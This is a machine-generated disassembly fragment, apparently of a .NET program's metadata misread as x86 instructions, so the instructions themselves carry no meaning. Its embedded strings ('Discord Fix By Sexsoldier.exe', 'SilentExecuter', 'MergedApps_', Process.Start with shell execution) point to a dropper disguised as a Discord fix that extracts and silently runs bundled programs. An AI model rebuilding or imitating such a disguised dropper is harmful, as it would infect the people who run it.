  4025df:	00 de                	add    %bl,%dh
  4025e1:	03 f1                	add    %ecx,%esi
  4025e3:	00 09                	add    %cl,(%ecx)
  4025e5:	00 6a 00             	add    %ch,0x0(%edx)
  4025e8:	13 00                	adc    (%eax),%eax
  4025ea:	2e 00 0b             	add    %cl,%cs:(%ebx)
  4025ed:	00 ff                	add    %bh,%bh
  4025ef:	00 2e                	add    %ch,(%esi)
  4025f1:	00 13                	add    %dl,(%ebx)
  4025f3:	00 08                	add    %cl,(%eax)
  4025f5:	01 63 00             	add    %esp,0x0(%ebx)
  4025f8:	83 00 5e             	addl   $0x5e,(%eax)
  4025fb:	00 b3 00 f8 00 37    	add    %dh,0x3700f800(%ebx)
  402601:	00 a4 00 50 20 00 00 	add    %ah,0x2050(%eax,%eax,1)
  402608:	01 00                	add    %eax,(%eax)
  40260a:	04 80                	add    $0x80,%al
	...
  40261c:	d6                   	salc
  40261d:	00 00                	add    %al,(%eax)
  40261f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40262a:	00 00                	add    %al,(%eax)
  40262c:	01 00                	add    %eax,(%eax)
  40262e:	3f                   	aas
  40262f:	00 00                	add    %al,(%eax)
  402631:	00 00                	add    %al,(%eax)
  402633:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40263e:	00 00                	add    %al,(%eax)
  402640:	01 00                	add    %eax,(%eax)
  402642:	48                   	dec    %eax
	...
  40264b:	00 00                	add    %al,(%eax)
  40264d:	3c 4d                	cmp    $0x4d,%al
  40264f:	6f                   	outsl  %ds:(%esi),(%dx)
  402650:	64 75 6c             	fs jne 0x4026bf
  402653:	65 3e 00 44 69 73    	gs add %al,%ds:0x73(%ecx,%ebp,2)
  402659:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40265c:	64 20 46 69          	and    %al,%fs:0x69(%esi)
  402660:	78 20                	js     0x402682
  402662:	42                   	inc    %edx
  402663:	79 20                	jns    0x402685
  402665:	53                   	push   %ebx
  402666:	65 78 73             	gs js  0x4026dc
  402669:	6f                   	outsl  %ds:(%esi),(%dx)
  40266a:	6c                   	insb   (%dx),%es:(%edi)
  40266b:	64 69 65 72 2e 65 78 	imul   $0x6578652e,%fs:0x72(%ebp),%esp
  402672:	65 
  402673:	00 50 72             	add    %dl,0x72(%eax)
  402676:	6f                   	outsl  %ds:(%esi),(%dx)
  402677:	67 72 61             	addr16 jb 0x4026db
  40267a:	6d                   	insl   (%dx),%es:(%edi)
  40267b:	00 53 69             	add    %dl,0x69(%ebx)
  40267e:	6c                   	insb   (%dx),%es:(%edi)
  40267f:	65 6e                	outsb  %gs:(%esi),(%dx)
  402681:	74 45                	je     0x4026c8
  402683:	78 65                	js     0x4026ea
  402685:	63 75 74             	arpl   %esi,0x74(%ebp)
  402688:	65 72 00             	gs jb  0x40268b
  40268b:	6d                   	insl   (%dx),%es:(%edi)
  40268c:	73 63                	jae    0x4026f1
  40268e:	6f                   	outsl  %ds:(%esi),(%dx)
  40268f:	72 6c                	jb     0x4026fd
  402691:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  402698:	65 6d                	gs insl (%dx),%es:(%edi)
  40269a:	00 4f 62             	add    %cl,0x62(%edi)
  40269d:	6a 65                	push   $0x65
  40269f:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4026a3:	61                   	popa
  4026a4:	69 6e 00 52 75 6e 57 	imul   $0x576e7552,0x0(%esi),%ebp
  4026ab:	69 74 68 6f 75 74 57 	imul   $0x61577475,0x6f(%eax,%ebp,2),%esi
  4026b2:	61 
  4026b3:	69 74 00 2e 63 74 6f 	imul   $0x726f7463,0x2e(%eax,%eax,1),%esi
  4026ba:	72 
  4026bb:	00 65 78             	add    %ah,0x78(%ebp)
  4026be:	65 50                	gs push %eax
  4026c0:	61                   	popa
  4026c1:	74 68                	je     0x40272b
  4026c3:	00 53 79             	add    %dl,0x79(%ebx)
  4026c6:	73 74                	jae    0x40273c
  4026c8:	65 6d                	gs insl (%dx),%es:(%edi)
  4026ca:	2e 52                	cs push %edx
  4026cc:	75 6e                	jne    0x40273c
  4026ce:	74 69                	je     0x402739
  4026d0:	6d                   	insl   (%dx),%es:(%edi)
  4026d1:	65 2e 43             	gs cs inc %ebx
  4026d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d5:	6d                   	insl   (%dx),%es:(%edi)
  4026d6:	70 69                	jo     0x402741
  4026d8:	6c                   	insb   (%dx),%es:(%edi)
  4026d9:	65 72 53             	gs jb  0x40272f
  4026dc:	65 72 76             	gs jb  0x402755
  4026df:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  4026e6:	6d                   	insl   (%dx),%es:(%edi)
  4026e7:	70 69                	jo     0x402752
  4026e9:	6c                   	insb   (%dx),%es:(%edi)
  4026ea:	61                   	popa
  4026eb:	74 69                	je     0x402756
  4026ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4026ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4026ef:	52                   	push   %edx
  4026f0:	65 6c                	gs insb (%dx),%es:(%edi)
  4026f2:	61                   	popa
  4026f3:	78 61                	js     0x402756
  4026f5:	74 69                	je     0x402760
  4026f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4026f9:	73 41                	jae    0x40273c
  4026fb:	74 74                	je     0x402771
  4026fd:	72 69                	jb     0x402768
  4026ff:	62 75 74             	bound  %esi,0x74(%ebp)
  402702:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402706:	6e                   	outsb  %ds:(%esi),(%dx)
  402707:	74 69                	je     0x402772
  402709:	6d                   	insl   (%dx),%es:(%edi)
  40270a:	65 43                	gs inc %ebx
  40270c:	6f                   	outsl  %ds:(%esi),(%dx)
  40270d:	6d                   	insl   (%dx),%es:(%edi)
  40270e:	70 61                	jo     0x402771
  402710:	74 69                	je     0x40277b
  402712:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402715:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40271c:	69 
  40271d:	62 75 74             	bound  %esi,0x74(%ebp)
  402720:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  402725:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402728:	64 20 46 69          	and    %al,%fs:0x69(%esi)
  40272c:	78 20                	js     0x40274e
  40272e:	42                   	inc    %edx
  40272f:	79 20                	jns    0x402751
  402731:	53                   	push   %ebx
  402732:	65 78 73             	gs js  0x4027a8
  402735:	6f                   	outsl  %ds:(%esi),(%dx)
  402736:	6c                   	insb   (%dx),%es:(%edi)
  402737:	64 69 65 72 00 45 6e 	imul   $0x766e4500,%fs:0x72(%ebp),%esp
  40273e:	76 
  40273f:	69 72 6f 6e 6d 65 6e 	imul   $0x6e656d6e,0x6f(%edx),%esi
  402746:	74 00                	je     0x402748
  402748:	53                   	push   %ebx
  402749:	70 65                	jo     0x4027b0
  40274b:	63 69 61             	arpl   %ebp,0x61(%ecx)
  40274e:	6c                   	insb   (%dx),%es:(%edi)
  40274f:	46                   	inc    %esi
  402750:	6f                   	outsl  %ds:(%esi),(%dx)
  402751:	6c                   	insb   (%dx),%es:(%edi)
  402752:	64 65 72 00          	fs gs jb 0x402756
  402756:	47                   	inc    %edi
  402757:	65 74 46             	gs je  0x4027a0
  40275a:	6f                   	outsl  %ds:(%esi),(%dx)
  40275b:	6c                   	insb   (%dx),%es:(%edi)
  40275c:	64 65 72 50          	fs gs jb 0x4027b0
  402760:	61                   	popa
  402761:	74 68                	je     0x4027cb
  402763:	00 47 75             	add    %al,0x75(%edi)
  402766:	69 64 00 4e 65 77 47 	imul   $0x75477765,0x4e(%eax,%eax,1),%esp
  40276d:	75 
  40276e:	69 64 00 54 6f 53 74 	imul   $0x7274536f,0x54(%eax,%eax,1),%esp
  402775:	72 
  402776:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  40277d:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  402784:	63 61 74             	arpl   %esp,0x74(%ecx)
  402787:	00 53 79             	add    %dl,0x79(%ebx)
  40278a:	73 74                	jae    0x402800
  40278c:	65 6d                	gs insl (%dx),%es:(%edi)
  40278e:	2e 49                	cs dec %ecx
  402790:	4f                   	dec    %edi
  402791:	00 50 61             	add    %dl,0x61(%eax)
  402794:	74 68                	je     0x4027fe
  402796:	00 43 6f             	add    %al,0x6f(%ebx)
  402799:	6d                   	insl   (%dx),%es:(%edi)
  40279a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40279d:	65 00 44 69 72       	add    %al,%gs:0x72(%ecx,%ebp,2)
  4027a2:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4027a7:	79 00                	jns    0x4027a9
  4027a9:	44                   	inc    %esp
  4027aa:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4027b1:	79 49                	jns    0x4027fc
  4027b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4027b4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4027b6:	00 43 72             	add    %al,0x72(%ebx)
  4027b9:	65 61                	gs popa
  4027bb:	74 65                	je     0x402822
  4027bd:	44                   	inc    %esp
  4027be:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4027c5:	79 00                	jns    0x4027c7
  4027c7:	53                   	push   %ebx
  4027c8:	79 73                	jns    0x40283d
  4027ca:	74 65                	je     0x402831
  4027cc:	6d                   	insl   (%dx),%es:(%edi)
  4027cd:	2e 43                	cs inc %ebx
  4027cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d0:	6c                   	insb   (%dx),%es:(%edi)
  4027d1:	6c                   	insb   (%dx),%es:(%edi)
  4027d2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4027d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4027d8:	73 2e                	jae    0x402808
  4027da:	47                   	inc    %edi
  4027db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4027dd:	65 72 69             	gs jb  0x402849
  4027e0:	63 00                	arpl   %eax,(%eax)
  4027e2:	4c                   	dec    %esp
  4027e3:	69 73 74 60 31 00 53 	imul   $0x53003160,0x74(%ebx),%esi
  4027ea:	79 73                	jns    0x40285f
  4027ec:	74 65                	je     0x402853
  4027ee:	6d                   	insl   (%dx),%es:(%edi)
  4027ef:	2e 52                	cs push %edx
  4027f1:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4027f4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4027f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4027fa:	00 41 73             	add    %al,0x73(%ecx)
  4027fd:	73 65                	jae    0x402864
  4027ff:	6d                   	insl   (%dx),%es:(%edi)
  402800:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402804:	47                   	inc    %edi
  402805:	65 74 45             	gs je  0x40284d
  402808:	78 65                	js     0x40286f
  40280a:	63 75 74             	arpl   %esi,0x74(%ebp)
  40280d:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  402814:	6d                   	insl   (%dx),%es:(%edi)
  402815:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402819:	67 65 74 5f          	addr16 gs je 0x40287c
  40281d:	4c                   	dec    %esp
  40281e:	6f                   	outsl  %ds:(%esi),(%dx)
  40281f:	63 61 74             	arpl   %esp,0x74(%ecx)
  402822:	69 6f 6e 00 46 69 6c 	imul   $0x6c694600,0x6e(%edi),%ebp
  402829:	65 53                	gs push %ebx
  40282b:	74 72                	je     0x40289f
  40282d:	65 61                	gs popa
  40282f:	6d                   	insl   (%dx),%es:(%edi)
  402830:	00 46 69             	add    %al,0x69(%esi)
  402833:	6c                   	insb   (%dx),%es:(%edi)
  402834:	65 4d                	gs dec %ebp
  402836:	6f                   	outsl  %ds:(%esi),(%dx)
  402837:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40283c:	6c                   	insb   (%dx),%es:(%edi)
  40283d:	65 41                	gs inc %ecx
  40283f:	63 63 65             	arpl   %esp,0x65(%ebx)
  402842:	73 73                	jae    0x4028b7
  402844:	00 53 74             	add    %dl,0x74(%ebx)
  402847:	72 65                	jb     0x4028ae
  402849:	61                   	popa
  40284a:	6d                   	insl   (%dx),%es:(%edi)
  40284b:	00 67 65             	add    %ah,0x65(%edi)
  40284e:	74 5f                	je     0x4028af
  402850:	4c                   	dec    %esp
  402851:	65 6e                	outsb  %gs:(%esi),(%dx)
  402853:	67 74 68             	addr16 je 0x4028be
  402856:	00 53 65             	add    %dl,0x65(%ebx)
  402859:	65 6b 4f 72 69       	imul   $0x69,%gs:0x72(%edi),%ecx
  40285e:	67 69 6e 00 53 65 65 	imul   $0x6b656553,0x0(%bp),%ebp
  402865:	6b 
  402866:	00 42 79             	add    %al,0x79(%edx)
  402869:	74 65                	je     0x4028d0
  40286b:	00 52 65             	add    %dl,0x65(%edx)
  40286e:	61                   	popa
  40286f:	64 00 3c 50          	add    %bh,%fs:(%eax,%edx,2)
  402873:	72 69                	jb     0x4028de
  402875:	76 61                	jbe    0x4028d8
  402877:	74 65                	je     0x4028de
  402879:	49                   	dec    %ecx
  40287a:	6d                   	insl   (%dx),%es:(%edi)
  40287b:	70 6c                	jo     0x4028e9
  40287d:	65 6d                	gs insl (%dx),%es:(%edi)
  40287f:	65 6e                	outsb  %gs:(%esi),(%dx)
  402881:	74 61                	je     0x4028e4
  402883:	74 69                	je     0x4028ee
  402885:	6f                   	outsl  %ds:(%esi),(%dx)
  402886:	6e                   	outsb  %ds:(%esi),(%dx)
  402887:	44                   	inc    %esp
  402888:	65 74 61             	gs je  0x4028ec
  40288b:	69 6c 73 3e 7b 38 30 	imul   $0x3130387b,0x3e(%ebx,%esi,2),%ebp
  402892:	31 
  402893:	36 43                	ss inc %ebx
  402895:	45                   	inc    %ebp
  402896:	42                   	inc    %edx
  402897:	31 2d 37 45 38 46    	xor    %ebp,0x46384537
  40289d:	2d 34 41 45 42       	sub    $0x42454134,%eax
  4028a2:	2d 41 43 30 44       	sub    $0x44304341,%eax
  4028a7:	2d 31 32 44 45       	sub    $0x45443231,%eax
  4028ac:	46                   	inc    %esi
  4028ad:	34 41                	xor    $0x41,%al
  4028af:	38 30                	cmp    %dh,(%eax)
  4028b1:	43                   	inc    %ebx
  4028b2:	44                   	inc    %esp
  4028b3:	35 7d 00 43 6f       	xor    $0x6f43007d,%eax
  4028b8:	6d                   	insl   (%dx),%es:(%edi)
  4028b9:	70 69                	jo     0x402924
  4028bb:	6c                   	insb   (%dx),%es:(%edi)
  4028bc:	65 72 47             	gs jb  0x402906
  4028bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4028c1:	65 72 61             	gs jb  0x402925
  4028c4:	74 65                	je     0x40292b
  4028c6:	64 41                	fs inc %ecx
  4028c8:	74 74                	je     0x40293e
  4028ca:	72 69                	jb     0x402935
  4028cc:	62 75 74             	bound  %esi,0x74(%ebp)
  4028cf:	65 00 24 24          	add    %ah,%gs:(%esp)
  4028d3:	6d                   	insl   (%dx),%es:(%edi)
  4028d4:	65 74 68             	gs je  0x40293f
  4028d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4028d8:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  4028dc:	30 30                	xor    %dh,(%eax)
  4028de:	30 30                	xor    %dh,(%eax)
  4028e0:	30 31                	xor    %dh,(%ecx)
  4028e2:	2d 31 00 52 75       	sub    $0x75520031,%eax
  4028e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4028e8:	74 69                	je     0x402953
  4028ea:	6d                   	insl   (%dx),%es:(%edi)
  4028eb:	65 48                	gs dec %eax
  4028ed:	65 6c                	gs insb (%dx),%es:(%edi)
  4028ef:	70 65                	jo     0x402956
  4028f1:	72 73                	jb     0x402966
  4028f3:	00 41 72             	add    %al,0x72(%ecx)
  4028f6:	72 61                	jb     0x402959
  4028f8:	79 00                	jns    0x4028fa
  4028fa:	52                   	push   %edx
  4028fb:	75 6e                	jne    0x40296b
  4028fd:	74 69                	je     0x402968
  4028ff:	6d                   	insl   (%dx),%es:(%edi)
  402900:	65 46                	gs inc %esi
  402902:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  402909:	64 6c                	fs insb (%dx),%es:(%edi)
  40290b:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  40290f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  402916:	65 
  402917:	41                   	inc    %ecx
  402918:	72 72                	jb     0x40298c
  40291a:	61                   	popa
  40291b:	79 00                	jns    0x40291d
  40291d:	42                   	inc    %edx
  40291e:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  402925:	72 
  402926:	74 65                	je     0x40298d
  402928:	72 00                	jb     0x40292a
  40292a:	54                   	push   %esp
  40292b:	6f                   	outsl  %ds:(%esi),(%dx)
  40292c:	49                   	dec    %ecx
  40292d:	6e                   	outsb  %ds:(%esi),(%dx)
  40292e:	74 36                	je     0x402966
  402930:	34 00                	xor    $0x0,%al
  402932:	54                   	push   %esp
  402933:	6f                   	outsl  %ds:(%esi),(%dx)
  402934:	49                   	dec    %ecx
  402935:	6e                   	outsb  %ds:(%esi),(%dx)
  402936:	74 33                	je     0x40296b
  402938:	32 00                	xor    (%eax),%al
  40293a:	53                   	push   %ebx
  40293b:	79 73                	jns    0x4029b0
  40293d:	74 65                	je     0x4029a4
  40293f:	6d                   	insl   (%dx),%es:(%edi)
  402940:	2e 54                	cs push %esp
  402942:	65 78 74             	gs js  0x4029b9
  402945:	00 45 6e             	add    %al,0x6e(%ebp)
  402948:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40294b:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  402952:	5f                   	pop    %edi
  402953:	55                   	push   %ebp
  402954:	54                   	push   %esp
  402955:	46                   	inc    %esi
  402956:	38 00                	cmp    %al,(%eax)
  402958:	47                   	inc    %edi
  402959:	65 74 53             	gs je  0x4029af
  40295c:	74 72                	je     0x4029d0
  40295e:	69 6e 67 00 4d 61 74 	imul   $0x74614d00,0x67(%esi),%ebp
  402965:	68 00 4d 69 6e       	push   $0x6e694d00
  40296a:	00 57 72             	add    %dl,0x72(%edi)
  40296d:	69 74 65 00 49 44 69 	imul   $0x73694449,0x0(%ebp,%eiz,2),%esi
  402974:	73 
  402975:	70 6f                	jo     0x4029e6
  402977:	73 61                	jae    0x4029da
  402979:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40297d:	44                   	inc    %esp
  40297e:	69 73 70 6f 73 65 00 	imul   $0x65736f,0x70(%ebx),%esi
  402985:	41                   	inc    %ecx
  402986:	64 64 00 45 6e       	fs add %al,%fs:0x6e(%ebp)
  40298b:	75 6d                	jne    0x4029fa
  40298d:	65 72 61             	gs jb  0x4029f1
  402990:	74 6f                	je     0x402a01
  402992:	72 00                	jb     0x402994
  402994:	47                   	inc    %edi
  402995:	65 74 45             	gs je  0x4029dd
  402998:	6e                   	outsb  %ds:(%esi),(%dx)
  402999:	75 6d                	jne    0x402a08
  40299b:	65 72 61             	gs jb  0x4029ff
  40299e:	74 6f                	je     0x402a0f
  4029a0:	72 00                	jb     0x4029a2
  4029a2:	67 65 74 5f          	addr16 gs je 0x402a05
  4029a6:	43                   	inc    %ebx
  4029a7:	75 72                	jne    0x402a1b
  4029a9:	72 65                	jb     0x402a10
  4029ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4029ac:	74 00                	je     0x4029ae
  4029ae:	4d                   	dec    %ebp
  4029af:	6f                   	outsl  %ds:(%esi),(%dx)
  4029b0:	76 65                	jbe    0x402a17
  4029b2:	4e                   	dec    %esi
  4029b3:	65 78 74             	gs js  0x402a2a
  4029b6:	00 53 79             	add    %dl,0x79(%ebx)
  4029b9:	73 74                	jae    0x402a2f
  4029bb:	65 6d                	gs insl (%dx),%es:(%edi)
  4029bd:	2e 44                	cs inc %esp
  4029bf:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4029c6:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  4029cd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4029d0:	73 53                	jae    0x402a25
  4029d2:	74 61                	je     0x402a35
  4029d4:	72 74                	jb     0x402a4a
  4029d6:	49                   	dec    %ecx
  4029d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4029d8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4029da:	00 73 65             	add    %dh,0x65(%ebx)
  4029dd:	74 5f                	je     0x402a3e
  4029df:	46                   	inc    %esi
  4029e0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4029e7:	00 
  4029e8:	47                   	inc    %edi
  4029e9:	65 74 44             	gs je  0x402a30
  4029ec:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4029f3:	79 4e                	jns    0x402a43
  4029f5:	61                   	popa
  4029f6:	6d                   	insl   (%dx),%es:(%edi)
  4029f7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4029fb:	74 5f                	je     0x402a5c
  4029fd:	57                   	push   %edi
  4029fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ff:	72 6b                	jb     0x402a6c
  402a01:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  402a08:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  402a0c:	79 00                	jns    0x402a0e
  402a0e:	73 65                	jae    0x402a75
  402a10:	74 5f                	je     0x402a71
  402a12:	55                   	push   %ebp
  402a13:	73 65                	jae    0x402a7a
  402a15:	53                   	push   %ebx
  402a16:	68 65 6c 6c 45       	push   $0x456c6c65
  402a1b:	78 65                	js     0x402a82
  402a1d:	63 75 74             	arpl   %esi,0x74(%ebp)
  402a20:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  402a24:	6f                   	outsl  %ds:(%esi),(%dx)
  402a25:	63 65 73             	arpl   %esp,0x73(%ebp)
  402a28:	73 00                	jae    0x402a2a
  402a2a:	53                   	push   %ebx
  402a2b:	74 61                	je     0x402a8e
  402a2d:	72 74                	jb     0x402aa3
  402a2f:	00 00                	add    %al,(%eax)
  402a31:	17                   	pop    %ss
  402a32:	4d                   	dec    %ebp
  402a33:	00 65 00             	add    %ah,0x0(%ebp)
  402a36:	72 00                	jb     0x402a38
  402a38:	67 00 65 00          	add    %ah,0x0(%di)
  402a3c:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  402a40:	70 00                	jo     0x402a42
  402a42:	70 00                	jo     0x402a44
  402a44:	73 00                	jae    0x402a46
  402a46:	5f                   	pop    %edi
  402a47:	00 00                	add    %al,(%eax)
  402a49:	00 00                	add    %al,(%eax)
  402a4b:	00 b1 ce 16 80 8f    	add    %dh,-0x707fe932(%ecx)
  402a51:	7e eb                	jle    0x402a3e
  402a53:	4a                   	dec    %edx
  402a54:	ac                   	lods   %ds:(%esi),%al
  402a55:	0d 12 de f4 a8       	or     $0xa8f4de12,%eax
  402a5a:	0c d5                	or     $0xd5,%al
  402a5c:	00 08                	add    %cl,(%eax)
  402a5e:	b7 7a                	mov    $0x7a,%bh
  402a60:	5c                   	pop    %esp
  402a61:	56                   	push   %esi
  402a62:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  402a65:	89 03                	mov    %eax,(%ebx)
  402a67:	00 00                	add    %al,(%eax)
  402a69:	01 04 00             	add    %eax,(%eax,%eax,1)
  402a6c:	01 01                	add    %eax,(%ecx)
  402a6e:	0e                   	push   %cs
  402a6f:	03 20                	add    (%eax),%esp
  402a71:	00 01                	add    %al,(%ecx)
  402a73:	04 20                	add    $0x20,%al
  402a75:	01 01                	add    %eax,(%ecx)
  402a77:	08 05 00 01 0e 11    	or     %al,0x110e0100
  402a7d:	15 04 00 00 11       	adc    $0x11000004,%eax
  402a82:	19 03                	sbb    %eax,(%ebx)
  402a84:	20 00                	and    %al,(%eax)
  402a86:	0e                   	push   %cs
  402a87:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402a8c:	0e                   	push   %cs
  402a8d:	05 00 01 12 29       	add    $0x29120100,%eax
  402a92:	0e                   	push   %cs
  402a93:	05 15 12 2d 01       	add    $0x12d1215,%eax
  402a98:	0e                   	push   %cs
  402a99:	04 00                	add    $0x0,%al
  402a9b:	00 12                	add    %dl,(%edx)
  402a9d:	31 08                	xor    %ecx,(%eax)
  402a9f:	20 03                	and    %al,(%ebx)
  402aa1:	01 0e                	add    %ecx,(%esi)
  402aa3:	11 39                	adc    %edi,(%ecx)
  402aa5:	11 3d 03 20 00 0a    	adc    %edi,0xa002003
  402aab:	06                   	push   %es
  402aac:	20 02                	and    %al,(%edx)
  402aae:	0a 0a                	or     (%edx),%cl
  402ab0:	11 45 07             	adc    %eax,0x7(%ebp)
  402ab3:	20 03                	and    %al,(%ebx)
  402ab5:	08 1d 05 08 08 04    	or     %bl,0x4080805
  402abb:	01 00                	add    %eax,(%eax)
  402abd:	00 00                	add    %al,(%eax)
  402abf:	02 06                	add    (%esi),%al
  402ac1:	08 07                	or     %al,(%edi)
  402ac3:	00 02                	add    %al,(%edx)
  402ac5:	01 12                	add    %edx,(%edx)
  402ac7:	55                   	push   %ebp
  402ac8:	11 59 06             	adc    %ebx,0x6(%ecx)
  402acb:	00 02                	add    %al,(%edx)
  402acd:	0a 1d 05 08 06 00    	or     0x60805,%bl
  402ad3:	02 08                	add    (%eax),%cl
  402ad5:	1d 05 08 04 00       	sbb    $0x40805,%eax
  402ada:	00 12                	add    %dl,(%edx)
  402adc:	61                   	popa
  402add:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  402ae2:	05 05 00 02 0a       	add    $0xa020005,%eax
  402ae7:	0a 0a                	or     (%edx),%cl
  402ae9:	07                   	pop    %es
  402aea:	20 03                	and    %al,(%ebx)
  402aec:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  402af2:	20 01                	and    %al,(%ecx)
  402af4:	01 13                	add    %edx,(%ebx)
  402af6:	00 08                	add    %cl,(%eax)
  402af8:	20 00                	and    %al,(%eax)
  402afa:	15 11 6d 01 13       	adc    $0x13016d11,%eax
  402aff:	00 05 15 11 6d 01    	add    %al,0x16d1115
  402b05:	0e                   	push   %cs
  402b06:	04 20                	add    $0x20,%al
  402b08:	00 13                	add    %dl,(%ebx)
  402b0a:	00 03                	add    %al,(%ebx)
  402b0c:	20 00                	and    %al,(%eax)
  402b0e:	02 2e                	add    (%esi),%ch
  402b10:	07                   	pop    %es
  402b11:	1b 0e                	sbb    (%esi),%ecx
  402b13:	15 12 2d 01 0e       	adc    $0xe012d12,%eax
  402b18:	0e                   	push   %cs
  402b19:	12 35 0a 1d 05 1d    	adc    0x1d051d0a,%dh
  402b1f:	05 02 08 0a 08       	add    $0x80a0802,%eax
  402b24:	08 1d 05 08 1d 05    	or     %bl,0x51d0805
  402b2a:	0e                   	push   %cs
  402b2b:	1d 05 0a 0e 12       	sbb    $0x120e0a05,%eax
  402b30:	35 1d 05 0a 08       	xor    $0x80a051d,%eax
  402b35:	08 0e                	or     %cl,(%esi)
  402b37:	11 19                	adc    %ebx,(%ecx)
  402b39:	15 11 6d 01 0e       	adc    $0xe016d11,%eax
  402b3e:	04 20                	add    $0x20,%al
  402b40:	01 01                	add    %eax,(%ecx)
  402b42:	0e                   	push   %cs
  402b43:	04 00                	add    $0x0,%al
  402b45:	01 0e                	add    %ecx,(%esi)
  402b47:	0e                   	push   %cs
  402b48:	04 20                	add    $0x20,%al
  402b4a:	01 01                	add    %eax,(%ecx)
  402b4c:	02 06                	add    (%esi),%al
  402b4e:	00 01                	add    %al,(%ecx)
  402b50:	12 75 12             	adc    0x12(%ebp),%dh
  402b53:	71 06                	jno    0x402b5b
  402b55:	07                   	pop    %es
  402b56:	02 12                	add    (%edx),%dl
  402b58:	71 12                	jno    0x402b6c
  402b5a:	71 08                	jno    0x402b64
  402b5c:	01 00                	add    %eax,(%eax)
  402b5e:	08 00                	or     %al,(%eax)
  402b60:	00 00                	add    %al,(%eax)
  402b62:	00 00                	add    %al,(%eax)
  402b64:	1e                   	push   %ds
  402b65:	01 00                	add    %eax,(%eax)
  402b67:	01 00                	add    %eax,(%eax)
  402b69:	54                   	push   %esp
  402b6a:	02 16                	add    (%esi),%dl
  402b6c:	57                   	push   %edi
  402b6d:	72 61                	jb     0x402bd0
  402b6f:	70 4e                	jo     0x402bbf
  402b71:	6f                   	outsl  %ds:(%esi),(%dx)
  402b72:	6e                   	outsb  %ds:(%esi),(%dx)
  402b73:	45                   	inc    %ebp
  402b74:	78 63                	js     0x402bd9
  402b76:	65 70 74             	gs jo  0x402bed
  402b79:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402b80:	77 73                	ja     0x402bf5
  402b82:	01 00                	add    %eax,(%eax)
  402b84:	ac                   	lods   %ds:(%esi),%al
  402b85:	2b 00                	sub    (%eax),%eax
	...
  402b8f:	00 ce                	add    %cl,%dh
  402b91:	2b 00                	sub    (%eax),%eax
  402b93:	00 00                	add    %al,(%eax)
  402b95:	20 00                	and    %al,(%eax)
	...
  402bab:	00 c0                	add    %al,%al
  402bad:	2b 00                	sub    (%eax),%eax
	...
  402bbf:	00 00                	add    %al,(%eax)
